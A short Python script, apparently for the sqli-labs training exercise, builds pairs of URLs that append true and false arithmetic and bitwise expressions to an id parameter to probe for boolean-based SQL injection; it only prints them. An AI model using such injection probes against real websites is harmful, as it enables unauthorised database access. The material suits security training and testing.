fuzz_digit = [['1', '0'], ['1-0', '1-1'], ['1+0', '1+1'], ['1*0', '1*1'], ['2/1', '0/1'],
              ['2<<1', '0<<2'], ['2>>1', '0<<2'], ['1|1', '0|0'], ['1||1', '0||0'],
              ['1&&1', '0&&1'], ['1^1', '1^0'], ['1%3', '3%3']]

url = 'http://demo.sqli.com/Less-2/?id=1'

for each in fuzz_digit:
    req_url1 = url + ' and {}'.format(each[0])
    req_url2 = url + ' and {}'.format(each[1])
    print(req_url1, req_url2)